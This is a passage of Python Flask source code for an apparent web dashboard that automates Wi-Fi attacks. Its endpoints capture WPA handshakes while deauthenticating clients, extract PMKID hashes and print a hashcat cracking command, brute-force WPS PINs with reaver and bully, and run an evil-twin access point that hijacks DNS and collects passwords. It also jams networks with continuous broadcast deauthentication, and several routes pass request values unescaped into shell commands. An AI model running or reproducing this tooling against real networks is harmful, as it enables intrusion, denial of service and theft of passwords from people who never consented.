            time.sleep(3); elapsed += 3  # 3s poll — matches fufu-sec's sleep 5 but faster
            proc = state["active_processes"].get("handshake_cap")
            if proc and proc.poll() is not None:
                _log("[!] airodump-ng died — restarting")
                _restart_airodump("airodump died"); continue
            cap_sz = os.path.getsize(current_cap) if os.path.exists(current_cap) else 0
            _log(f"[~] {elapsed}s elapsed — file: {cap_sz} bytes — checking...")
            if cap_sz <= 1024: continue

            # Step 1: fast tshark EAPOL pre-filter (fufu-sec: tshark -Y eapol | head -100)
            # This catches natural reconnects (client came back on its own) immediately —
            # no need to wait for aircrack-ng's slower open-file parse.
            eapol_count = _tshark_eapol_count(current_cap, bssid, timeout_sec=3)
            if eapol_count < 2:
                # Not enough EAPOL frames yet — skip the heavy aircrack-ng check
                if eapol_count == 1:
                    _log(f"[~] 1 EAPOL frame seen (need ≥2 for a complete handshake) — waiting...")
                continue
            _log(f"[~] tshark: {eapol_count} EAPOL frames — running aircrack-ng verify...")

            # Step 2: confirm with aircrack-ng (6s live-file timeout)
            # Longer timeout reduces false negatives caused by write races between
            # airodump-ng (still writing) and aircrack-ng (reading open file)
            live_ok, _, _ = _ac_verify(current_cap, bssid, timeout_sec=6)
            if live_ok:
                _log(f"[~] Candidate detected at {elapsed}s — stopping for closed-file verify")
                if _confirm_and_finish(current_cap):
                    state["handshake_running"] = False; return
                _restart_airodump("false positive")

        _log(f"[*] Timeout ({timeout}s) reached — final verification")
        deauth_stop.set(); kill_bg("handshake_cap"); time.sleep(2.0)
        if _full_verify(current_cap):
            state.update({"handshake_found": True, "handshake_result": "CAPTURED",
                          "last_cap_file": current_cap})
            _log(f"[+] ✓ HANDSHAKE CONFIRMED at timeout: {current_cap}")
            audit("HANDSHAKE_CAPTURED", f"bssid={bssid} file={current_cap}")
        else:
            state.update({"handshake_found": False, "handshake_result": "FAILED_NO_HANDSHAKE"})
            _log("[-] No complete handshake captured.")
            pmf_note = " ← LIKELY CAUSE (WPA3/SAE detected)" if pmf_detected else ""
            _log(f"    • PMF/802.11w on AP — deauth cryptographically ignored{pmf_note}")
            _log("      If PMF: wait for natural client reconnect (power cycle a device on the AP)")
            _log("    • No active clients on AP at time of capture")
            _log(f"    • Injection may not be working — test: aireplay-ng --test {iface}")
            _log("    • Interface may have been renamed — verify: iw dev")
            _log(f"    • Retry with explicit client MAC (look in scan CSV for associated client)")
            audit("HANDSHAKE_FAILED", f"bssid={bssid}")
        state["handshake_running"] = False

    threading.Thread(target=hs_worker, daemon=True).start()
    return jsonify({"success": "Handshake capture started. Deauth fires in 2 seconds.",
                    "output": "\n".join(log_lines), "cap_file": cap_file})


@app.route("/api/handshake/status")
def handshake_status():
    cap_file = state.get("last_cap_file", TMPDIR+"handshake-01.cap")
    return jsonify({"running": state.get("handshake_running",False),
                    "found": state.get("handshake_found",False), "cap_file": cap_file,
                    "cap_size": os.path.getsize(cap_file) if os.path.exists(cap_file) else 0})


@app.route("/api/handshake/log")
def handshake_log():
    return jsonify({"running": state.get("handshake_running",False),
                    "found": state.get("handshake_found",False),
                    "result": state.get("handshake_result","idle"),
                    "cap_file": state.get("last_cap_file",""),
                    "log_lines": state.get("hs_log",[]),
                    "deauth_log": state.get("deauth_log",[])})


@app.route("/api/handshake/verify", methods=["POST"])
def handshake_verify():
    data    = request.json or {}
    capfile = (data.get("file") or "").strip() or state.get("last_cap_file","")
    bssid   = (data.get("bssid") or "").strip().upper() or state.get("last_bssid","")
    if not capfile or not os.path.exists(capfile):
        available = sorted([os.path.join(TMPDIR,f) for f in os.listdir(TMPDIR) if f.endswith(".cap")])
        hint = "Available: "+", ".join(available) if available else "No cap files in "+TMPDIR
        return jsonify({"error": f"Cap file not found: {capfile or '(none)'}. {hint}"})
    if not _safe_path(capfile, "/tmp/fufu-sec"): return jsonify({"error": "Invalid path"}), 400
    sz = os.path.getsize(capfile)
    out = [f"[*] Verifying: {capfile}", f"[*] Size: {sz} bytes", f"[*] BSSID: {bssid or '(any)'}",
           f"[*] Running: echo '1' | timeout -s SIGTERM 20 aircrack-ng \"{capfile}\""]
    if sz < 1024:
        out.append(f"[!] File too small ({sz} bytes)")
        return jsonify({"output": "\n".join(out), "cap_file": capfile, "error": f"File too small ({sz} bytes)"})
    has_hs, raw_out, _ = _ac_verify(capfile, bssid)
    out += ["", raw_out.strip() or "(no output)", ""]
    if has_hs:
        wpa2_ok = _ac_wpa2_check(capfile, bssid)
        out.append("[+] WPA2 secondary validation "+("passed" if wpa2_ok else "failed (may be WPA1/TKIP)"))
        out.append("[+] ✓ Handshake CONFIRMED")
    else:
        out.append("[-] No valid handshake found")
    return jsonify({"output": "\n".join(out), "cap_file": capfile,
                    "success": f"Handshake FOUND in {capfile}" if has_hs else None,
                    "error":   None if has_hs else "No handshake in this file"})


@app.route("/api/handshake/delete", methods=["POST"])
def handshake_delete():
    data = request.json or {}; filepath = data.get("file","")
    if not filepath or not filepath.startswith(TMPDIR):
        return jsonify({"error": "Invalid path — can only delete files in "+TMPDIR})
    if not _safe_path(filepath): return jsonify({"error": "Path traversal denied"}), 400
    deleted = []; base = filepath.replace(".cap","")
    for ext in [".cap",".csv",".kismet.csv",".log.csv","_22000.txt"]:
        fp = base+ext
        if os.path.exists(fp):
            try: os.remove(fp); deleted.append(fp)
            except: pass
    if os.path.exists(filepath) and filepath not in deleted:
        try: os.remove(filepath); deleted.append(filepath)
        except: pass
    if deleted:
        return jsonify({"success": f"Deleted: {', '.join([d.split('/')[-1] for d in deleted])}", "deleted": deleted})
    return jsonify({"error": f"File not found: {filepath}"})


@app.route("/api/handshake/list")
def handshake_list():
    files = sorted([os.path.join(TMPDIR,f) for f in os.listdir(TMPDIR) if f.endswith(".cap")])
    last_bssid = state.get("last_bssid","").upper(); annotated = []
    for fp in files:
        sz = os.path.getsize(fp); has_hs = False
        if sz >= 1024:
            ok, _, _ = _ac_verify(fp, last_bssid); has_hs = ok
        annotated.append({"path": fp, "size": sz, "has_handshake": has_hs})
    return jsonify({"files": files, "annotated": annotated, "count": len(files)})


# ── PMKID ─────────────────────────────────────────────────────────────────────

@app.route("/api/pmkid/capture", methods=["POST"])
def pmkid_capture():
    """
    PMKID capture — matches fufu-sec launch_pmkid_capture() exactly.
    Three command variants based on hcxdumptool version (fufu-sec logic):
      >= 6.3.0 : BPF filter via tcpdump (-c <ch> --rds=1 --bpf=<file>)
      >= 6.0.0 : --filterlist_ap=<file> --filtermode=2   (BSSID in file, no colons)
      < 6.0.0  : --filterlist=<file> --filtermode=2      (older flag name)
    The user's version is 6.3.5 which requires the BPF method.
    """
    data    = request.json or {}
    bssid   = (data.get("bssid") or "").strip().upper()
    channel = str(data.get("channel") or "").strip()
    timeout = int(data.get("timeout", 45))
    iface   = get_active_iface()

    if not iface:  return jsonify({"error": "No monitor interface"})
    if not tool_exists("hcxdumptool"): return jsonify({"error": "hcxdumptool not installed"})

    # Detect hcxdumptool version — mirrors fufu-sec get_hcxdumptool_version()
    ver_out, _, _ = run_cmd("hcxdumptool --version 2>&1 | head -1")
    ver_match = re.search(r"hcxdumptool\s+(\S+)", ver_out)
    hcx_ver = ver_match.group(1) if ver_match else "0.0.0"

    def _ver_ge(v, minimum):
        """Compare version strings numerically."""
        try:
            vp = [int(x) for x in v.split(".")]
            mp = [int(x) for x in minimum.split(".")]
            # pad to same length
            while len(vp) < len(mp): vp.append(0)
            while len(mp) < len(vp): mp.append(0)
            return vp >= mp
        except Exception:
            return False

    out_pcap = TMPDIR + "pmkid.pcapng"
    out_hash = TMPDIR + "pmkid_hash.txt"
    log_lines = [
        f"[*] hcxdumptool version: {hcx_ver}",
        f"[*] Interface : {iface}",
        f"[*] BSSID     : {bssid or '(any)'}",
        f"[*] Timeout   : {timeout}s",
        f"[*] Output    : {out_hash}",
    ]

    # Clean old files
    for f in [out_pcap, out_hash, TMPDIR+"pmkid.bpf", TMPDIR+"target.txt"]:
        try: os.remove(f)
        except: pass

    if _ver_ge(hcx_ver, "6.3.0"):
        # BPF method (fufu-sec >= 6.3.0 branch)
        # Requires: tcpdump, channel, bssid
        if not bssid or not channel:
            return jsonify({"error": "BSSID and channel required for hcxdumptool >= 6.3.0 (BPF method)"})
        if not tool_exists("tcpdump"):
            return jsonify({"error": "tcpdump required for hcxdumptool >= 6.3.0 — apt install tcpdump"})
        # Build BPF filter: tcpdump -i <iface> wlan addr3 <bssid> -ddd > pmkid.bpf
        bpf_out, bpf_err, bpf_rc = run_cmd(
            f"tcpdump -i {iface} 'wlan addr3 {bssid}' -ddd > {TMPDIR}pmkid.bpf 2>&1",
            timeout=10
        )
        if bpf_rc != 0:
            # Fallback: try without quotes around the filter expression
            run_cmd(f"tcpdump -i {iface} wlan addr3 {bssid} -ddd > {TMPDIR}pmkid.bpf 2>&1", timeout=10)
        # hcxdumptool -c syntax: <channel> for 2.4GHz, <channel>a for 5GHz
        # CH 1-14 = 2.4GHz (no suffix), CH 36+ = 5GHz (append 'a')
        # Band modifier — matches airgeddon launch_pmkid_capture() exactly
        # airgeddon v11.61 line 15024-15028:
        #   channel > 14 → "b"  (5GHz)
        #   channel ≤ 14 → "a"  (2.4GHz)
        ch_int = int(channel)
        hcxdumptool_band_modifier = "b" if ch_int > 14 else "a"
        hcx_params = f"-c {channel}{hcxdumptool_band_modifier} --rds=1 --bpf={TMPDIR}pmkid.bpf -w {out_pcap}"
        log_lines.append(f"[*] Method    : BPF (>= 6.3.0)")
        log_lines.append(f"[*] Band      : {'5GHz' if ch_int > 14 else '2.4GHz'} (modifier={hcxdumptool_band_modifier})")
    elif _ver_ge(hcx_ver, "6.0.0"):
        # filterlist_ap method (fufu-sec 6.0.0 <= ver < 6.3.0)
        bssid_nocolon = bssid.replace(":", "") if bssid else ""
        target_file = TMPDIR + "target.txt"
        with open(target_file, "w") as tf:
            tf.write(bssid_nocolon + "\n")
        hcx_params = f"--enable_status=1 --filterlist_ap={target_file} --filtermode=2 -o {out_pcap}"
        log_lines.append(f"[*] Method    : filterlist_ap (>= 6.0.0)")
    else:
        # Legacy filterlist method (fufu-sec < 6.0.0)
        bssid_nocolon = bssid.replace(":", "") if bssid else ""
        target_file = TMPDIR + "target.txt"
        with open(target_file, "w") as tf:
            tf.write(bssid_nocolon + "\n")
        hcx_params = f"--enable_status=1 --filterlist={target_file} --filtermode=2 -o {out_pcap}"
        log_lines.append(f"[*] Method    : filterlist (< 6.0.0)")

    cmd = f"hcxdumptool -i {iface} {hcx_params}"
    log_lines.append(f"[*] Command   : {cmd}")

    # Kill any competing processes that may hold the interface
    # (mirrors airgeddon's airmon check kill approach)
    for competing in ["capture", "handshake_cap", "scan", "pmkid"]:
        kill_bg(competing)
    time.sleep(0.5)
    run_cmd(f"ip link set {iface} up 2>/dev/null", timeout=5)

    proc = run_bg("pmkid", cmd)
    time.sleep(2.0)   # hcxdumptool needs ~2s to arm the interface
    if proc.poll() is not None:
        try: err_out = proc.stdout.read(1200).strip()
        except: err_out = ""
        lo = (err_out or "").lower()
        # Parse hcxdumptool error for user-friendly diagnosis
        diag = []
        if "packet_statistics" in lo or "arm interface" in lo:
            diag.append("Interface busy or driver conflict — another process holds the interface")
            diag.append(f"Fix: run 'airmon-ng check kill' then retry, or disable/enable monitor mode")
        if "monitor mode may not work" in lo or "driver is broken" in lo:
            diag.append("Adapter driver does not support hcxdumptool — try a different adapter (Alfa AWUS036ACH)")
        if "permission" in lo or "eperm" in lo:
            diag.append("Permission error — run server.py as root: sudo python3 server.py")
        if not diag:
            diag.append("Check interface and permissions")
        err_msg = " | ".join(diag)
        log_lines.append(f"[!] hcxdumptool failed: {err_msg}")
        if err_out: log_lines.append(err_out[:400])
        return jsonify({
            "error": f"hcxdumptool failed: {err_msg}",
            "output": "\n".join(log_lines)
        })

    audit("PMKID_START", f"bssid={bssid or 'any'} ver={hcx_ver}")

    def _stop_and_convert():
        time.sleep(timeout)
        kill_bg("pmkid")
        time.sleep(1.0)  # flush
        if os.path.exists(out_pcap) and os.path.getsize(out_pcap) > 0:
            conv_out, _, _ = run_cmd(f"hcxpcapngtool -o {out_hash} {out_pcap} 2>&1")
            if os.path.exists(out_hash) and os.path.getsize(out_hash) > 0:
                state["pmkid_result"] = "done"
                state["pmkid_hash"]   = out_hash
                audit("PMKID_DONE", f"bssid={bssid} hash={out_hash}")
            else:
                state["pmkid_result"] = "no_pmkid"
        else:
            state["pmkid_result"] = "no_pmkid"
        state["pmkid_running"] = False

    state["pmkid_running"] = True
    state["pmkid_result"]  = "running"
    threading.Thread(target=_stop_and_convert, daemon=True).start()

    return jsonify({
        "success": f"PMKID capture started ({timeout}s). Version: {hcx_ver}",
        "output":  "\n".join(log_lines) + f"\n[*] hcxdumptool started (PID {proc.pid})",
    })






@app.route("/api/pmkid/inspect", methods=["POST"])
def pmkid_inspect():
    """
    Dedicated PMKID hash file inspector.
    Validates: file existence, non-empty, hashcat 22000 format (WPA*PMKID*MAC*ESSID).
    Returns: line count, valid hash count, first 3 hash lines, format check.
    """
    data     = request.json or {}
    filepath = (data.get("file") or state.get("pmkid_hash", TMPDIR+"pmkid_hash.txt")).strip()

    out = [f"[*] Inspecting: {filepath}"]

    # 1. File existence
    if not os.path.exists(filepath):
        out.append(f"[!] File not found: {filepath}")
        out.append(f"    Run PMKID capture first — file will be created at {TMPDIR}pmkid_hash.txt")
        return jsonify({"output": "\n".join(out), "valid": False,
                        "error": f"File not found: {filepath}"})

    # 2. Permission check
    if not os.access(filepath, os.R_OK):
        out.append(f"[!] Permission denied reading: {filepath}")
        return jsonify({"output": "\n".join(out), "valid": False, "error": "Permission denied"})

    # 3. Size check
    size = os.path.getsize(filepath)
    out.append(f"[*] File size: {size} bytes")
    if size == 0:
        out.append("[!] File is empty — AP may not support PMKID or capture was too short")
        out.append("    Try: increase timeout, or verify AP is broadcasting RSN IE")
        return jsonify({"output": "\n".join(out), "valid": False,
                        "error": "Hash file is empty — no PMKID captured"})

    # 4. Read and validate lines
    try:
        with open(filepath, encoding="utf-8", errors="replace") as f:
            lines = [l.rstrip() for l in f.readlines() if l.strip()]
    except Exception as e:
        return jsonify({"output": "\n".join(out), "valid": False, "error": f"Read error: {e}"})

    total_lines = len(lines)
    out.append(f"[*] Total lines: {total_lines}")

    # 5. Validate hashcat 22000 format: WPA*PMKID*MAC*ESSID or WPA*MIC*MAC1*MAC2*ESSID
    # Each field is hex. PMKID is 32 hex chars, MIC is 32 hex chars.
    hash22k = re.compile(r"^WPA\*[0-9A-Fa-f]+\*[0-9A-Fa-f]+\*[0-9A-Fa-f]+\*")
    valid_lines = [l for l in lines if hash22k.match(l)]
    pmkid_lines = [l for l in valid_lines if l.startswith("WPA*02*")]  # type 02 = PMKID
    mic_lines   = [l for l in valid_lines if l.startswith("WPA*01*")]  # type 01 = MIC/EAPOL

    out.append(f"[*] Valid hashcat 22000 lines: {len(valid_lines)}")
    out.append(f"    PMKID hashes (type 02): {len(pmkid_lines)}")
    out.append(f"    EAPOL/MIC  (type 01):   {len(mic_lines)}")

    if not valid_lines:
        out.append("[!] No valid hashcat 22000 format lines found")
        out.append("    Expected format: WPA*<type>*<PMKID/MIC>*<MAC1>*<MAC2>*<SSID>*...")
        out.append("    File contents preview:")
        for l in lines[:3]:
            out.append(f"    {l[:120]}")
        return jsonify({"output": "\n".join(out), "valid": False,
                        "error": "No valid WPA hashes in file — may need hcxpcapngtool conversion"})

    # 6. Show first few valid lines
    out.append("[*] Sample hashes:")
    for l in valid_lines[:3]:
        out.append(f"    {l[:100]}{'...' if len(l)>100 else ''}")

    # 7. Hashcat command hint
    out.append(f"[+] ✓ Hash file is valid — ready to crack")
    out.append(f"[*] Crack command: hashcat -m 22000 {filepath} /usr/share/wordlists/rockyou.txt")

    return jsonify({
        "output":       "\n".join(out),
        "valid":        True,
        "total_lines":  total_lines,
        "valid_hashes": len(valid_lines),
        "pmkid_count":  len(pmkid_lines),
        "mic_count":    len(mic_lines),
        "filepath":     filepath,
        "success":      f"✓ {len(valid_lines)} valid hash(es) ready for cracking",
    })


@app.route("/api/pmkid/verify", methods=["POST"])
def pmkid_verify():
    """
    Verify a PMKID pcapng file — runs hcxpcapngtool to convert and checks output.
    Used after capture to confirm real PMKIDs were collected before cracking.
    """
    data     = request.json or {}
    pcap     = (data.get("pcap") or state.get("pmkid_pcap", TMPDIR+"pmkid.pcapng")).strip()
    bssid    = (data.get("bssid") or state.get("last_bssid","")).strip().upper()
    out_hash = TMPDIR + "pmkid_verify.txt"

    log = [f"[*] Verifying PMKID capture: {pcap}"]
    if bssid: log.append(f"[*] BSSID filter: {bssid}")

    if not os.path.exists(pcap):
        log.append(f"[!] pcapng file not found: {pcap}")
        return jsonify({"output": "\n".join(log), "valid": False,
                        "error": f"File not found: {pcap} — run PMKID capture first"})

    size = os.path.getsize(pcap)
    log.append(f"[*] pcapng size: {size} bytes")
    if size < 100:
        log.append("[!] File too small — capture likely failed or AP rejected probes")
        return jsonify({"output": "\n".join(log), "valid": False,
                        "error": "pcapng too small — no frames captured"})

    if not tool_exists("hcxpcapngtool"):
        log.append("[!] hcxpcapngtool not installed — apt install hcxtools")
        return jsonify({"output": "\n".join(log), "valid": False,
                        "error": "hcxpcapngtool not installed"})

    # Convert pcapng → hashcat 22000
    try: os.remove(out_hash)
    except: pass
    conv_cmd = f"hcxpcapngtool -o {out_hash} {pcap} 2>&1"
    log.append(f"[*] Converting: {conv_cmd}")
    conv_out, _, conv_rc = run_cmd(conv_cmd, timeout=30)
    if conv_out.strip():
        log.append(conv_out.strip()[:500])

    if not os.path.exists(out_hash) or os.path.getsize(out_hash) == 0:
        log.append("[!] Conversion produced no hashes")
        log.append("    Possible reasons:")
        log.append("    • AP does not broadcast PMKID (try handshake capture instead)")
        log.append("    • hcxdumptool stopped too early — use a longer timeout")
        log.append("    • BPF filter was too strict — try without BSSID filter")
        return jsonify({"output": "\n".join(log), "valid": False,
                        "error": "No PMKID hashes extracted — AP may not support PMKID"})

    # Count and validate hashes
    with open(out_hash) as f:
        hash_lines = [l.strip() for l in f if l.strip()]
    hash22k = re.compile(r"^WPA\*[0-9A-Fa-f]+\*[0-9A-Fa-f]+\*[0-9A-Fa-f]+\*")
    valid   = [l for l in hash_lines if hash22k.match(l)]

    # Filter by BSSID if provided
    bssid_hex = bssid.replace(":","").lower() if bssid else ""
    if bssid_hex:
        matched = [l for l in valid if bssid_hex in l.lower()]
        log.append(f"[*] Hashes matching BSSID {bssid}: {len(matched)}/{len(valid)}")
    else:
        matched = valid

    log.append(f"[*] Total hashes extracted: {len(valid)}")
    log.append(f"[*] PMKID type-02: {len([l for l in valid if l.startswith('WPA*02*')])}")
    log.append(f"[*] EAPOL type-01: {len([l for l in valid if l.startswith('WPA*01*')])}")

    for l in matched[:3]:
        log.append(f"    {l[:100]}{'...' if len(l)>100 else ''}")

    if matched:
        # Copy verified hashes to the standard hash file
        with open(TMPDIR+"pmkid_hash.txt", "w") as f:
            f.write("\n".join(matched) + "\n")
        state["pmkid_hash"] = TMPDIR+"pmkid_hash.txt"
        state["pmkid_result"] = "done"
        log.append(f"[+] ✓ {len(matched)} PMKID hash(es) verified and saved → {TMPDIR}pmkid_hash.txt")
        audit("PMKID_VERIFIED", f"bssid={bssid} hashes={len(matched)}")
        return jsonify({"output": "\n".join(log), "valid": True, "hash_count": len(matched),
                        "hash_file": TMPDIR+"pmkid_hash.txt",
                        "success": f"✓ {len(matched)} hash(es) verified — ready to crack"})
    else:
        log.append("[-] No matching PMKID hashes — BSSID mismatch or AP does not support PMKID")
        return jsonify({"output": "\n".join(log), "valid": False, "hash_count": 0,
                        "error": "No PMKID hashes match the specified BSSID"})

@app.route("/api/pmkid/stop", methods=["POST"])
def pmkid_stop():
    kill_bg("pmkid")
    state["pmkid_running"] = False
    state["pmkid_result"]  = "stopped"
    audit("PMKID_STOP", "")
    return jsonify({"success": "hcxdumptool stopped"})

# ── WPS ───────────────────────────────────────────────────────────────────────

@app.route("/api/wps/reaver", methods=["POST"])
def wps_reaver():
    data = request.json or {}; bssid = data.get("bssid"); channel = data.get("channel")
    delay = int(data.get("delay",1)); pixie = data.get("pixie",False); iface = get_active_iface()
    opts = str(data.get("opts") or "").strip()
    retries = int(data.get("retries",3))
    if not bssid: return jsonify({"error": "BSSID required"})
    if not iface: return jsonify({"error": "No monitor interface"})
    if not tool_exists("reaver"): return jsonify({"error": "reaver not installed"})
    audit("WPS_REAVER", f"bssid={bssid} pixie={pixie} retries={retries}")
    pixie_flag = "-K 1" if pixie else ""
    cmd = f"reaver -i {iface} -b {bssid} -c {channel} -d {delay} -r {retries} -v {pixie_flag} {opts} --no-nacks".strip()
    proc = run_bg("reaver", cmd)
    output = read_output(proc, timeout=60)
    key_m = re.search(r"WPA PSK: '?(.+?)'?$", output, re.MULTILINE)
    pin_m = re.search(r"WPS PIN: '?(\d+)'?", output)
    return jsonify({"output": output, "password": key_m.group(1) if key_m else None,
                    "pin": pin_m.group(1) if pin_m else None,
                    "success": f"KEY FOUND: {key_m.group(1)}" if key_m else None})


@app.route("/api/wps/bully", methods=["POST"])
def wps_bully():
    data = request.json or {}; bssid = data.get("bssid"); channel = data.get("channel")
    verb = str(data.get("verb") or "-v 3").strip()
    flags = str(data.get("flags") or "-F -B -S").strip()
    iface = get_active_iface()
    if not bssid: return jsonify({"error": "BSSID required"})
    if not iface: return jsonify({"error": "No monitor interface"})
    if not tool_exists("bully"): return jsonify({"error": "bully not installed"})
    audit("WPS_BULLY", f"bssid={bssid}")
    cmd = f"bully {iface} -b {bssid} -c {channel} {verb} {flags}".strip()
    proc = run_bg("bully", cmd)
    output = read_output(proc, timeout=60)
    key_m = re.search(r"PSK\s*=\s*'?(.+?)'?$", output, re.MULTILINE)
    return jsonify({"output": output, "password": key_m.group(1) if key_m else None,
                    "success": f"KEY FOUND: {key_m.group(1)}" if key_m else None})


@app.route("/api/wps/pixie", methods=["POST"])
def wps_pixie():
    data = request.json or {}; bssid = data.get("bssid"); channel = data.get("channel")
    iface = get_active_iface()
    if not bssid: return jsonify({"error": "BSSID required"})
    if not tool_exists("reaver"): return jsonify({"error": "reaver/pixiewps not installed"})
    audit("WPS_PIXIE", f"bssid={bssid}")
    proc = run_bg("pixie", f"reaver -i {iface} -b {bssid} -c {channel} -K 1 -v")
    output = read_output(proc, timeout=45)
    key_m = re.search(r"WPA PSK: '?(.+?)'?$", output, re.MULTILINE)
    return jsonify({"output": output, "password": key_m.group(1) if key_m else None,
                    "success": f"Pixie Dust: {key_m.group(1)}" if key_m else None,
                    "error": None if key_m else "Pixie Dust failed"})


@app.route("/api/wps/pins", methods=["POST"])
def wps_pins():
    data = request.json or {}; bssid = data.get("bssid","")
    known_pins = ["12345670","00000000","11111111","22222222","33333333","44444444",
                  "55555555","66666666","77777777","88888888","99999999","20172527",
                  "46264848","76229909","62327145","10864111","31957199","30432031","71412252","01741625"]
    db_path = "./known_pins.db"
    if os.path.exists(db_path) and bssid:
        prefix = bssid.replace(":","")[:6].upper()
        try:
            with open(db_path) as f:
                for line in f:
                    if prefix in line.upper():
                        pins = re.findall(r"\b\d{8}\b", line)
                        if pins: known_pins = pins + known_pins; break
        except: pass
    return jsonify({"pins": list(dict.fromkeys(known_pins))})


@app.route("/api/wps/pinattack", methods=["POST"])
def wps_pinattack():
    data = request.json or {}; bssid = data.get("bssid"); channel = data.get("channel")
    iface = get_active_iface()
    if not bssid: return jsonify({"error": "BSSID required"})
    audit("WPS_PINATTACK", f"bssid={bssid}")
    pins = json.loads(wps_pins().get_data())["pins"]
    out = [f"[*] Trying {len(pins)} known PINs against {bssid}"] + [f"[>] Queued PIN: {p}" for p in pins[:5]]
    run_bg("pinattack", f"for pin in {' '.join(pins)}; do reaver -i {iface} -b {bssid} -c {channel or 1} -p $pin -v --no-nacks 2>&1 | grep -E 'WPA PSK|locked' || true; done")
    return jsonify({"output": "\n".join(out), "success": f"PIN attack launched — {len(pins)} PINs"})


# ── EVIL TWIN ────────────────────────────────────────────────────────────────

HOSTAPD_CONF = TMPDIR+"hostapd.conf"; DNSMASQ_CONF = TMPDIR+"dnsmasq.conf"

@app.route("/api/eviltwin/start", methods=["POST"])
def eviltwin_start():
    data = request.json or {}
    ssid = re.sub(r"[^\w\s\-_\.]", "", data.get("ssid","FreeWifi"))[:32]
    iface = data.get("interface","wlan0"); inet = data.get("inet_interface","eth0")
    channel = data.get("channel","6"); ap_type = data.get("type","open")
    subnet = re.sub(r"[^0-9.]","", data.get("subnet","10.0.0.1") or "10.0.0.1") or "10.0.0.1"
    _wpa_pass = str(data.get("password") or "12345678")[:63] or "12345678"
    wpa_block = f"wpa=2\nwpa_passphrase={_wpa_pass}\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n" if ap_type == "wpa2" else ""
    with open(HOSTAPD_CONF, "w") as f:
        f.write(f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel={channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n{wpa_block}")
    with open(DNSMASQ_CONF, "w") as f:
        f.write(f"interface={iface}\ndhcp-range={subnet.rsplit('.',1)[0]}.2,{subnet.rsplit('.',1)[0]}.30,255.255.255.0,12h\ndhcp-option=3,{subnet}\ndhcp-option=6,{subnet}\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\naddress=/#/{subnet}\n")
    run_cmd(f"ip addr add {subnet}/24 dev {iface} 2>/dev/null || true")
    run_cmd(f"ip link set {iface} up")
    run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
    run_cmd(f"iptables -t nat -A POSTROUTING -o {inet} -j MASQUERADE 2>/dev/null || nft add rule ip nat postrouting oif {inet} masquerade")
    run_bg("hostapd", f"hostapd {HOSTAPD_CONF}"); time.sleep(2)
    run_bg("dnsmasq_et", f"dnsmasq -C {DNSMASQ_CONF} --no-daemon")
    state["eviltwin_clients"] = 0; state["eviltwin_credentials"] = []
    audit("EVILTWIN_START", f"ssid={ssid}")
    return jsonify({"success": f"Evil Twin '{ssid}' launched on {iface}",
                    "output": f"SSID: {ssid}\nChannel: {channel}\nInterface: {iface}\nDHCP: 10.0.0.x/24"})


@app.route("/api/eviltwin/status")
def eviltwin_status():
    leases = 0
    try:
        with open("/var/lib/misc/dnsmasq.leases") as f: leases = len([l for l in f if l.strip()])
    except: pass
    state["eviltwin_clients"] = leases
    return jsonify({"clients": leases, "credentials": len(state["eviltwin_credentials"]),
                    "cred_list": state["eviltwin_credentials"]})


@app.route("/api/eviltwin/stop", methods=["POST"])
def eviltwin_stop():
    kill_bg("hostapd"); kill_bg("dnsmasq_et")
    run_cmd("echo 0 > /proc/sys/net/ipv4/ip_forward")
    run_cmd("iptables -t nat -D POSTROUTING -j MASQUERADE 2>/dev/null; "
            "iptables -t nat -F POSTROUTING 2>/dev/null; true")
    audit("EVILTWIN_STOP", "")
    return jsonify({"success": "Evil Twin AP stopped"})


@app.route("/api/eviltwin/creds")
def eviltwin_creds():
    creds = list(state.get("eviltwin_credentials",[]))
    log_file = TMPDIR+"ag.bettercap.log"
    if os.path.exists(log_file):
        try:
            with open(log_file) as f:
                for line in f:
                    if "password" in line.lower():
                        creds.append({"time":"?","type":"HTTP","user":"?","password":line.strip()})
        except: pass
    return jsonify({"credentials": creds, "count": len(creds)})


# ── DEAUTH ───────────────────────────────────────────────────────────────────

@app.route("/api/deauth", methods=["POST"])
def deauth():
    data = request.json or {}
    bssid = (data.get("bssid") or "").strip(); client = (data.get("client") or "").strip()
    count = int(data.get("count",0)); iface = get_active_iface()
    if not bssid: return jsonify({"error": "BSSID required"})
    if not iface: return jsonify({"error": "No monitor interface active"})
    if not tool_exists("aireplay-ng"): return jsonify({"error": "aireplay-ng not installed"})
    if not client or not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", client):
        client = "FF:FF:FF:FF:FF:FF"
    audit("DEAUTH", f"bssid={bssid} client={client} count={count}")
    count_val = str(count) if count > 0 else "0"
    cmd = (f"aireplay-ng -0 {count_val} -a {bssid} {iface}" if client == "FF:FF:FF:FF:FF:FF"
           else f"aireplay-ng -0 {count_val} -a {bssid} -c {client} {iface}")
    proc = run_bg("deauth", cmd); time.sleep(1.5)
    partial = ""
    try:
        import select as _sel
        if _sel.select([proc.stdout],[],[],1.5)[0]:
            for _ in range(20):
                line = proc.stdout.readline()
                if not line: break
                partial += line
    except: pass
    running = proc.poll() is None
    if not running:
        lo = partial.lower(); diag = []
        if "no such device" in lo or "invalid" in lo: diag.append(f"Interface '{iface}' not found.")
        if "injection" in lo or "failed" in lo: diag.append("Injection not supported.")
        if not diag: diag.append("aireplay-ng exited — run: aireplay-ng --test "+iface)
        err = " | ".join(diag)
        return jsonify({"error": err, "output": f"$ {cmd}\n{partial.strip()}\n[!] {err}"})
    label = f"Sending {count} deauth frames" if count > 0 else "Continuous deauth running"
    return jsonify({"output": f"$ {cmd}\n{partial.strip() or label+'...'}",
                    "success": f"{label} against {bssid} (PID {proc.pid})"})


@app.route("/api/deauth/stop", methods=["POST"])
def deauth_stop():
    kill_bg("deauth"); return jsonify({"success": "Deauth stopped"})


@app.route("/api/injection/test", methods=["POST"])
def injection_test():
    data  = request.json or {}
    iface = (data.get("interface") or "").strip() or get_active_iface()
    if not iface:
        return jsonify({"error": "No interface specified — enter the monitor interface name"})
    if not tool_exists("aireplay-ng"):
        return jsonify({"error": "aireplay-ng not installed — apt install aircrack-ng"})

    log_lines = [f"[*] Running injection test on {iface}..."]

    # ── Step 0: Adapter vendor pre-check ─────────────────────────────────────
    # Intel (iwlwifi/iwlegacy) and many Realtek built-in adapters NEVER support
    # packet injection regardless of monitor mode or driver version.
    # Detect early and warn so the user doesn't waste time debugging.
    driver_out, _, _ = run_cmd(
